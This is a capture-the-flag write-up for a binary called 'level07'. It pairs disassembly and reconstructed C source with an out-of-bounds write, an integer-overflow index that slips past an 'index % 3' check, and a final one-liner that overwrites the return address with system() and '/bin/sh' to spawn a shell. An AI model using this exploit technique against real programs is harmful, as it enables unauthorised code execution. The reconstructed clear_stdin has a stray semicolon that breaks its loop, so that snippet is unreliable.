# Steps
---
- ### Functions used in this program.
    ```c
    0x0804842c  _init
    0x08048470  printf
    0x08048480  fflush
    0x08048490  getchar
    0x080484a0  fgets
    0x080484b0  __stack_chk_fail
    0x080484c0  puts
    0x080484c0  puts@plt
    0x080484d0  __gmon_start__
    0x080484e0  __libc_start_main
    0x080484f0  memset
    0x08048500  __isoc99_scanf
    0x08048510  _start
    0x08048540  __do_global_dtors_aux
    0x080485a0  frame_dummy
    0x080485c4  clear_stdin
    0x080485e7  get_unum
    0x0804861f  prog_timeout
    0x08048630  store_number
    0x080486d7  read_number
    0x08048723  main
    0x08048a00  __libc_csu_init
    0x08048a70  __libc_csu_fini
    0x08048a72  __i686.get_pc_thunk.bx
    0x08048a80  __do_global_ctors_aux
    0x08048aac  _fini
    ```

- ### Assembly code of `main`.
    ```c
    0x08048723 <+0>:     push   %ebp
    0x08048724 <+1>:     mov    %esp,%ebp
    0x08048726 <+3>:     push   %edi
    0x08048727 <+4>:     push   %esi
    0x08048728 <+5>:     push   %ebx
    0x08048729 <+6>:     and    $0xfffffff0,%esp
    0x0804872c <+9>:     sub    $0x1d0,%esp
    0x08048732 <+15>:    mov    0xc(%ebp),%eax
    0x08048735 <+18>:    mov    %eax,0x1c(%esp)
    0x08048739 <+22>:    mov    0x10(%ebp),%eax
    0x0804873c <+25>:    mov    %eax,0x18(%esp)
    0x08048740 <+29>:    mov    %gs:0x14,%eax
    0x08048746 <+35>:    mov    %eax,0x1cc(%esp)
    0x0804874d <+42>:    xor    %eax,%eax
    0x0804874f <+44>:    movl   $0x0,0x1b4(%esp)
    0x0804875a <+55>:    movl   $0x0,0x1b8(%esp)
    0x08048765 <+66>:    movl   $0x0,0x1bc(%esp)
    0x08048770 <+77>:    movl   $0x0,0x1c0(%esp)
    0x0804877b <+88>:    movl   $0x0,0x1c4(%esp)
    0x08048786 <+99>:    movl   $0x0,0x1c8(%esp)
    0x08048791 <+110>:   lea    0x24(%esp),%ebx
    0x08048795 <+114>:   mov    $0x0,%eax
    0x0804879a <+119>:   mov    $0x64,%edx
    0x0804879f <+124>:   mov    %ebx,%edi
    0x080487a1 <+126>:   mov    %edx,%ecx
    0x080487a3 <+128>:   rep stos %eax,%es:(%edi)
    0x080487a5 <+130>:   jmp    0x80487ea <main+199>
    0x080487a7 <+132>:   mov    0x1c(%esp),%eax
    0x080487ab <+136>:   mov    (%eax),%eax
    0x080487ad <+138>:   movl   $0xffffffff,0x14(%esp)
    0x080487b5 <+146>:   mov    %eax,%edx
    0x080487b7 <+148>:   mov    $0x0,%eax
    0x080487bc <+153>:   mov    0x14(%esp),%ecx
    0x080487c0 <+157>:   mov    %edx,%edi
    0x080487c2 <+159>:   repnz scas %es:(%edi),%al
    0x080487c4 <+161>:   mov    %ecx,%eax
    0x080487c6 <+163>:   not    %eax
    0x080487c8 <+165>:   lea    -0x1(%eax),%edx
    0x080487cb <+168>:   mov    0x1c(%esp),%eax
    0x080487cf <+172>:   mov    (%eax),%eax
    0x080487d1 <+174>:   mov    %edx,0x8(%esp)
    0x080487d5 <+178>:   movl   $0x0,0x4(%esp)
    0x080487dd <+186>:   mov    %eax,(%esp)
    0x080487e0 <+189>:   call   0x80484f0 <memset@plt>
    0x080487e5 <+194>:   addl   $0x4,0x1c(%esp)
    0x080487ea <+199>:   mov    0x1c(%esp),%eax
    0x080487ee <+203>:   mov    (%eax),%eax
    0x080487f0 <+205>:   test   %eax,%eax
    0x080487f2 <+207>:   jne    0x80487a7 <main+132>
    0x080487f4 <+209>:   jmp    0x8048839 <main+278>
    0x080487f6 <+211>:   mov    0x18(%esp),%eax
    0x080487fa <+215>:   mov    (%eax),%eax
    0x080487fc <+217>:   movl   $0xffffffff,0x14(%esp)
    0x08048804 <+225>:   mov    %eax,%edx
    0x08048806 <+227>:   mov    $0x0,%eax
    0x0804880b <+232>:   mov    0x14(%esp),%ecx
    0x0804880f <+236>:   mov    %edx,%edi
    0x08048811 <+238>:   repnz scas %es:(%edi),%al
    0x08048813 <+240>:   mov    %ecx,%eax
    0x08048815 <+242>:   not    %eax
    0x08048817 <+244>:   lea    -0x1(%eax),%edx
    0x0804881a <+247>:   mov    0x18(%esp),%eax
    0x0804881e <+251>:   mov    (%eax),%eax
    0x08048820 <+253>:   mov    %edx,0x8(%esp)
    0x08048824 <+257>:   movl   $0x0,0x4(%esp)
    0x0804882c <+265>:   mov    %eax,(%esp)
    0x0804882f <+268>:   call   0x80484f0 <memset@plt>
    0x08048834 <+273>:   addl   $0x4,0x18(%esp)
    0x08048839 <+278>:   mov    0x18(%esp),%eax
    0x0804883d <+282>:   mov    (%eax),%eax
    0x0804883f <+284>:   test   %eax,%eax
    0x08048841 <+286>:   jne    0x80487f6 <main+211>
    0x08048843 <+288>:   movl   $0x8048b38,(%esp)
    0x0804884a <+295>:   call   0x80484c0 <puts@plt>
    0x0804884f <+300>:   mov    $0x8048d4b,%eax
    0x08048854 <+305>:   mov    %eax,(%esp)
    0x08048857 <+308>:   call   0x8048470 <printf@plt>
    0x0804885c <+313>:   movl   $0x1,0x1b4(%esp)
    0x08048867 <+324>:   mov    0x804a040,%eax
    0x0804886c <+329>:   mov    %eax,0x8(%esp)
    0x08048870 <+333>:   movl   $0x14,0x4(%esp)
    0x08048878 <+341>:   lea    0x1b8(%esp),%eax
    0x0804887f <+348>:   mov    %eax,(%esp)
    0x08048882 <+351>:   call   0x80484a0 <fgets@plt>
    0x08048887 <+356>:   lea    0x1b8(%esp),%eax
    0x0804888e <+363>:   movl   $0xffffffff,0x14(%esp)
    0x08048896 <+371>:   mov    %eax,%edx
    0x08048898 <+373>:   mov    $0x0,%eax
    0x0804889d <+378>:   mov    0x14(%esp),%ecx
    0x080488a1 <+382>:   mov    %edx,%edi
    0x080488a3 <+384>:   repnz scas %es:(%edi),%al
    0x080488a5 <+386>:   mov    %ecx,%eax
    0x080488a7 <+388>:   not    %eax
    0x080488a9 <+390>:   sub    $0x1,%eax
    0x080488ac <+393>:   sub    $0x1,%eax
    0x080488af <+396>:   movb   $0x0,0x1b8(%esp,%eax,1)
    0x080488b7 <+404>:   lea    0x1b8(%esp),%eax
    0x080488be <+411>:   mov    %eax,%edx
    0x080488c0 <+413>:   mov    $0x8048d5b,%eax
    0x080488c5 <+418>:   mov    $0x5,%ecx
    0x080488ca <+423>:   mov    %edx,%esi
    0x080488cc <+425>:   mov    %eax,%edi
    0x080488ce <+427>:   repz cmpsb %es:(%edi),%ds:(%esi)
    0x080488d0 <+429>:   seta   %dl
    0x080488d3 <+432>:   setb   %al
    0x080488d6 <+435>:   mov    %edx,%ecx
    0x080488d8 <+437>:   sub    %al,%cl
    0x080488da <+439>:   mov    %ecx,%eax
    0x080488dc <+441>:   movsbl %al,%eax
    0x080488df <+444>:   test   %eax,%eax
    0x080488e1 <+446>:   jne    0x80488f8 <main+469>
    0x080488e3 <+448>:   lea    0x24(%esp),%eax
    0x080488e7 <+452>:   mov    %eax,(%esp)
    0x080488ea <+455>:   call   0x8048630 <store_number>
    0x080488ef <+460>:   mov    %eax,0x1b4(%esp)
    0x080488f6 <+467>:   jmp    0x8048965 <main+578>
    0x080488f8 <+469>:   lea    0x1b8(%esp),%eax
    0x080488ff <+476>:   mov    %eax,%edx
    0x08048901 <+478>:   mov    $0x8048d61,%eax
    0x08048906 <+483>:   mov    $0x4,%ecx
    0x0804890b <+488>:   mov    %edx,%esi
    0x0804890d <+490>:   mov    %eax,%edi
    0x0804890f <+492>:   repz cmpsb %es:(%edi),%ds:(%esi)
    0x08048911 <+494>:   seta   %dl
    0x08048914 <+497>:   setb   %al
    0x08048917 <+500>:   mov    %edx,%ecx
    0x08048919 <+502>:   sub    %al,%cl
    0x0804891b <+504>:   mov    %ecx,%eax
    0x0804891d <+506>:   movsbl %al,%eax
    0x08048920 <+509>:   test   %eax,%eax
    0x08048922 <+511>:   jne    0x8048939 <main+534>
    0x08048924 <+513>:   lea    0x24(%esp),%eax
    0x08048928 <+517>:   mov    %eax,(%esp)
    0x0804892b <+520>:   call   0x80486d7 <read_number>
    0x08048930 <+525>:   mov    %eax,0x1b4(%esp)
    0x08048937 <+532>:   jmp    0x8048965 <main+578>
    0x08048939 <+534>:   lea    0x1b8(%esp),%eax
    0x08048940 <+541>:   mov    %eax,%edx
    0x08048942 <+543>:   mov    $0x8048d66,%eax
    0x08048947 <+548>:   mov    $0x4,%ecx
    0x0804894c <+553>:   mov    %edx,%esi
    0x0804894e <+555>:   mov    %eax,%edi
    0x08048950 <+557>:   repz cmpsb %es:(%edi),%ds:(%esi)
    0x08048952 <+559>:   seta   %dl
    0x08048955 <+562>:   setb   %al
    0x08048958 <+565>:   mov    %edx,%ecx
    0x0804895a <+567>:   sub    %al,%cl
    0x0804895c <+569>:   mov    %ecx,%eax
    0x0804895e <+571>:   movsbl %al,%eax
    0x08048961 <+574>:   test   %eax,%eax
    0x08048963 <+576>:   je     0x80489cf <main+684>
    0x08048965 <+578>:   cmpl   $0x0,0x1b4(%esp)
    0x0804896d <+586>:   je     0x8048989 <main+614>
    0x0804896f <+588>:   mov    $0x8048d6b,%eax
    0x08048974 <+593>:   lea    0x1b8(%esp),%edx
    0x0804897b <+600>:   mov    %edx,0x4(%esp)
    0x0804897f <+604>:   mov    %eax,(%esp)
    0x08048982 <+607>:   call   0x8048470 <printf@plt>
    0x08048987 <+612>:   jmp    0x80489a1 <main+638>
    0x08048989 <+614>:   mov    $0x8048d88,%eax
    0x0804898e <+619>:   lea    0x1b8(%esp),%edx
    0x08048995 <+626>:   mov    %edx,0x4(%esp)
    0x08048999 <+630>:   mov    %eax,(%esp)
    0x0804899c <+633>:   call   0x8048470 <printf@plt>
    0x080489a1 <+638>:   lea    0x1b8(%esp),%eax
    0x080489a8 <+645>:   movl   $0x0,(%eax)
    0x080489ae <+651>:   movl   $0x0,0x4(%eax)
    0x080489b5 <+658>:   movl   $0x0,0x8(%eax)
    0x080489bc <+665>:   movl   $0x0,0xc(%eax)
    0x080489c3 <+672>:   movl   $0x0,0x10(%eax)
    0x080489ca <+679>:   jmp    0x804884f <main+300>
    0x080489cf <+684>:   nop
    0x080489d0 <+685>:   mov    $0x0,%eax
    0x080489d5 <+690>:   mov    0x1cc(%esp),%esi
    0x080489dc <+697>:   xor    %gs:0x14,%esi
    0x080489e3 <+704>:   je     0x80489ea <main+711>
    0x080489e5 <+706>:   call   0x80484b0 <__stack_chk_fail@plt>
    0x080489ea <+711>:   lea    -0xc(%ebp),%esp
    0x080489ed <+714>:   pop    %ebx
    0x080489ee <+715>:   pop    %esi
    0x080489ef <+716>:   pop    %edi
    0x080489f0 <+717>:   pop    %ebp
    0x080489f1 <+718>:   ret
    ```
- ### Assembly code of `store_number` function.
    ```c
    0x08048630 <+0>:     push   %ebp
    0x08048631 <+1>:     mov    %esp,%ebp
    0x08048633 <+3>:     sub    $0x28,%esp
    0x08048636 <+6>:     movl   $0x0,-0x10(%ebp)
    0x0804863d <+13>:    movl   $0x0,-0xc(%ebp)
    0x08048644 <+20>:    mov    $0x8048ad3,%eax
    0x08048649 <+25>:    mov    %eax,(%esp)
    0x0804864c <+28>:    call   0x8048470 <printf@plt>
    0x08048651 <+33>:    call   0x80485e7 <get_unum>
    0x08048656 <+38>:    mov    %eax,-0x10(%ebp)
    0x08048659 <+41>:    mov    $0x8048add,%eax
    0x0804865e <+46>:    mov    %eax,(%esp)
    0x08048661 <+49>:    call   0x8048470 <printf@plt>
    0x08048666 <+54>:    call   0x80485e7 <get_unum>
    0x0804866b <+59>:    mov    %eax,-0xc(%ebp)
    0x0804866e <+62>:    mov    -0xc(%ebp),%ecx
    0x08048671 <+65>:    mov    $0xaaaaaaab,%edx
    0x08048676 <+70>:    mov    %ecx,%eax
    0x08048678 <+72>:    mul    %edx
    0x0804867a <+74>:    shr    %edx
    0x0804867c <+76>:    mov    %edx,%eax
    0x0804867e <+78>:    add    %eax,%eax
    0x08048680 <+80>:    add    %edx,%eax
    0x08048682 <+82>:    mov    %ecx,%edx
    0x08048684 <+84>:    sub    %eax,%edx
    0x08048686 <+86>:    test   %edx,%edx
    0x08048688 <+88>:    je     0x8048697 <store_number+103>
    0x0804868a <+90>:    mov    -0x10(%ebp),%eax
    0x0804868d <+93>:    shr    $0x18,%eax
    0x08048690 <+96>:    cmp    $0xb7,%eax
    0x08048695 <+101>:   jne    0x80486c2 <store_number+146>
    0x08048697 <+103>:   movl   $0x8048ae6,(%esp)
    0x0804869e <+110>:   call   0x80484c0 <puts@plt>
    0x080486a3 <+115>:   movl   $0x8048af8,(%esp)
    0x080486aa <+122>:   call   0x80484c0 <puts@plt>
    0x080486af <+127>:   movl   $0x8048ae6,(%esp)
    0x080486b6 <+134>:   call   0x80484c0 <puts@plt>
    0x080486bb <+139>:   mov    $0x1,%eax
    0x080486c0 <+144>:   jmp    0x80486d5 <store_number+165>
    0x080486c2 <+146>:   mov    -0xc(%ebp),%eax
    0x080486c5 <+149>:   shl    $0x2,%eax
    0x080486c8 <+152>:   add    0x8(%ebp),%eax
    0x080486cb <+155>:   mov    -0x10(%ebp),%edx
    0x080486ce <+158>:   mov    %edx,(%eax)
    0x080486d0 <+160>:   mov    $0x0,%eax
    0x080486d5 <+165>:   leave  
    0x080486d6 <+166>:   ret 
    ```
- ### Assembly code of `read_number` function.
    ```c
    0x080486d7 <+0>:     push   %ebp
    0x080486d8 <+1>:     mov    %esp,%ebp
    0x080486da <+3>:     sub    $0x28,%esp
    0x080486dd <+6>:     movl   $0x0,-0xc(%ebp)
    0x080486e4 <+13>:    mov    $0x8048add,%eax
    0x080486e9 <+18>:    mov    %eax,(%esp)
    0x080486ec <+21>:    call   0x8048470 <printf@plt>
    0x080486f1 <+26>:    call   0x80485e7 <get_unum>
    0x080486f6 <+31>:    mov    %eax,-0xc(%ebp)
    0x080486f9 <+34>:    mov    -0xc(%ebp),%eax
    0x080486fc <+37>:    shl    $0x2,%eax
    0x080486ff <+40>:    add    0x8(%ebp),%eax
    0x08048702 <+43>:    mov    (%eax),%edx
    0x08048704 <+45>:    mov    $0x8048b1b,%eax
    0x08048709 <+50>:    mov    %edx,0x8(%esp)
    0x0804870d <+54>:    mov    -0xc(%ebp),%edx
    0x08048710 <+57>:    mov    %edx,0x4(%esp)
    0x08048714 <+61>:    mov    %eax,(%esp)
    0x08048717 <+64>:    call   0x8048470 <printf@plt>
    0x0804871c <+69>:    mov    $0x0,%eax
    0x08048721 <+74>:    leave  
    0x08048722 <+75>:    ret 
    ```
- ### Assembly code of `get_unum` function.
    ```c
    0x080485e7 <+0>:     push   %ebp
    0x080485e8 <+1>:     mov    %esp,%ebp
    0x080485ea <+3>:     sub    $0x28,%esp
    0x080485ed <+6>:     movl   $0x0,-0xc(%ebp)
    0x080485f4 <+13>:    mov    0x804a060,%eax
    0x080485f9 <+18>:    mov    %eax,(%esp)
    0x080485fc <+21>:    call   0x8048480 <fflush@plt>
    0x08048601 <+26>:    mov    $0x8048ad0,%eax
    0x08048606 <+31>:    lea    -0xc(%ebp),%edx
    0x08048609 <+34>:    mov    %edx,0x4(%esp)
    0x0804860d <+38>:    mov    %eax,(%esp)
    0x08048610 <+41>:    call   0x8048500 <__isoc99_scanf@plt>
    0x08048615 <+46>:    call   0x80485c4 <clear_stdin>
    0x0804861a <+51>:    mov    -0xc(%ebp),%eax
    0x0804861d <+54>:    leave  
    0x0804861e <+55>:    ret  
    ```
- ### Assembly code of `clear_stdin` function.
    ```c
    0x080485c4 <+0>:     push   %ebp
    0x080485c5 <+1>:     mov    %esp,%ebp
    0x080485c7 <+3>:     sub    $0x18,%esp
    0x080485ca <+6>:     movb   $0x0,-0x9(%ebp)
    0x080485ce <+10>:    jmp    0x80485d1 <clear_stdin+13>
    0x080485d0 <+12>:    nop
    0x080485d1 <+13>:    call   0x8048490 <getchar@plt>
    0x080485d6 <+18>:    mov    %al,-0x9(%ebp)
    0x080485d9 <+21>:    cmpb   $0xa,-0x9(%ebp)
    0x080485dd <+25>:    je     0x80485e5 <clear_stdin+33>
    0x080485df <+27>:    cmpb   $0xff,-0x9(%ebp)
    0x080485e3 <+31>:    jne    0x80485d0 <clear_stdin+12>
    0x080485e5 <+33>:    leave  
    0x080485e6 <+34>:
    ```
    ####  Determinat the start of array in stack.
    ```c
    0x08048924 <+513>:   lea    0x24(%esp),%eax
    0x08048928 <+517>:   mov    %eax,(%esp)
    0x0804892b <+520>:   call   0x80486d7 <read_number>
    ```
    #### Look at this assembly we can see that the array start from `esp+0x24` or `esp+36`, and the register befor `pop` the addresses from stack.
    ```c
    ebx            0xffffd554       -10924
    esp            0xffffd530       0xffffd530
    ebp            0xffffd718       0xffffd718
    ```
    #### The `esp` point to `0xffffd530`, so `array` address is `0xffffd530+0x24` => `0xffffd554`, and `ebp` point to `0xffffd718` so return address loocated at the next address `0xffffd71c`, now we can calculate the distance form array to return address
    ```c
    >>> int(0xffffd71c-0xffffd554)
    456
    ```



- ### Source code.
    ```c
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    unsigned int get_unum(void) {
        unsigned int num = 0;

        fflush(stdout); 
        scanf("%u", &num);
        clear_stdin();

        return num;
    }


    void clear_stdin(void) {
        char c = 0;

        while (c != '\n' && c != (char)EOF);
            c = getchar();
    }


    int store_number(unsigned int *array) {
        unsigned int number;
        unsigned int index;

        printf(" Number: ");
        number = get_unum();
        printf(" Index: ");
        index = get_unum();

        if (index % 3 == 0) {
            puts(" *** ERROR! ***");
            puts("   This index is reserved for wil");
            puts(" *** ERROR! ***");
            return 1;
        }

        if ((number >> 24) == 0xb7) {
            puts(" *** ERROR! ***");
            puts("   This index is reserved for wil!");
            puts(" *** ERROR! ***");
            return 1;
        }

        array[index] = number;
        return 0;
    }

    int read_number(unsigned int *array) {
        unsigned int index;

        printf(" Index: ");
        index = get_unum();

        printf(" Number at data[%u] is %u\n", index, array[index]);
        
        return 0;
    }

    int main(int argc, char **argv, char **envp) {
        unsigned int array[100] = {0}; 
        char command[20] = {0};
        int status = 0;

        while (*envp != NULL) {
            memset(*envp, 0, strlen(*envp));
            envp++;
        }

        while (*argv != NULL) {
            memset(*argv, 0, strlen(*argv));
            argv++;
        }

        puts("----------------------------------------------------");
        puts("  Welcome to wil's crappy number storage service!   ");
        puts("----------------------------------------------------");
        puts(" Commands:                                          ");
        puts("    store - store a number into the data storage    ");
        puts("    read  - read a number from the data storage     ");
        puts("    quit  - exit the program                        ");
        puts("----------------------------------------------------");
        puts("   wil has reserved some storage :>                 ");
        puts("----------------------------------------------------");

        while (1) {
            printf("Input command: ");
            
            fgets(command, 20, stdin);
            
            command[strlen(command) - 1] = '\0';

            if (strncmp(command, "store", 5) == 0) {
                status = store_number(array);
            } 
            else if (strncmp(command, "read", 4) == 0) {
                status = read_number(array);
            } 
            else if (strncmp(command, "quit", 4) == 0) {
                return 0;
            }

            if (status != 0) {
                printf(" Failed to do %s command\n", command);
            } else {
                printf(" Completed %s command successfully\n", command);
            }
            
            memset(command, 0, 20);
        }

        return 0;
    }
    ```

    #### In the source code we can see that the program stores numbers to `array` and reads numbers from it, and there is no size limit. In `store` the program asks you for the number and the index so we can choose the index that we want to overwrite the return address; let's calculate the index.

    #### `array` has `100` elements but we can write in addresses out of the `array`, since there is no size limitation, so let's go back to the distance between `array` and the return address, the distance is `456` bytes and we store numbers and they have four bytes so to fill the bytes that are next to the array by `456` we should divide by `4` so `456 / 4 = 114` so the index that allows us to overwrite the return address is `114` let's try this.

    #### After trying we face a block check in the function `store_number` there is this line that blocks us `if (index % 3 == 0)` because `114 % 3 = 0` so we can't use `114` directly let's try use a number that will overflow and leave `114`
    ```c
    Input command: store
    Number: 50000
    Index: 114
    *** ERROR! ***
    This index is reserved for wil!
    *** ERROR! ***
    Failed to do store command
    Input command: 
    ```

    #### If we look at how the `store_number` function is storing the number here `array[index] = number;`, we will find that it gives the index to array subscript operation and the subscript operation as we know it multiplies the index by the size of the data type, since we use `int` size is `4` so `114` will be multiplied by `4` so it will give the previous number `114 * 4 = 456`.

    #### How we can use that to bypass the check, we can use a index that will overflow when it multiplied by `4` and leave `456` after because the subscribe want to use the real address so it will add the number of bytes to the start of `array` not index.

    #### The max of unsigned numbers is `2^(32)-1` so if we add one it will be `2^(32)` and like this it will overflow and all the bytes of the number will filled by ziros because `4` bytes can't hold `2^(32)` binary that contain 1 in first and `32` ziro's so this ziro's will be stored in the number bytes but the one will overflow we need `33` to store this number so if we try to store `2^(32)+1` we will store just one and `2^(32)` will overflow.

    #### So if we use a number that if we multiplied it by `4` it will give `2^(32)+456` we will have just `456` stored and `2^(32)` not, lets calculate it, easy we need just divid `2^(32)+456` over `4` and get the fake index.
    $$\frac{2^{32}+456}{4} = 1073741938$$

    #### Try use index that will overflow and left `114` instead of use `114` directly, `1073741938`.
    ```c
    Input command: read
    Index: 114
    Number at data[114] is 4158936339
    Completed read command successfully
    Input command: store
    Number: 2500
    Index: 1073741938
    Completed store command successfully
    Input command: read
    Index: 114
    Number at data[114] is 2500
    Completed read command successfully
    Input command:
    ```

    #### Address of system `0xf7e6aed0`, `4159090384`.

    #### Address of "/bin/sh" `0xf7f897ec`, `4160264172`.

- ### Solution
    ```sh
    (python -c 'print("store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit\n")'; cat) | ./level07 
    ```
    #### The solution command stores the address of `system` in index `114` the position of return address so overwrite it, and the address of its parameter `/bin/sh` at the index 116 after return address by four bytes.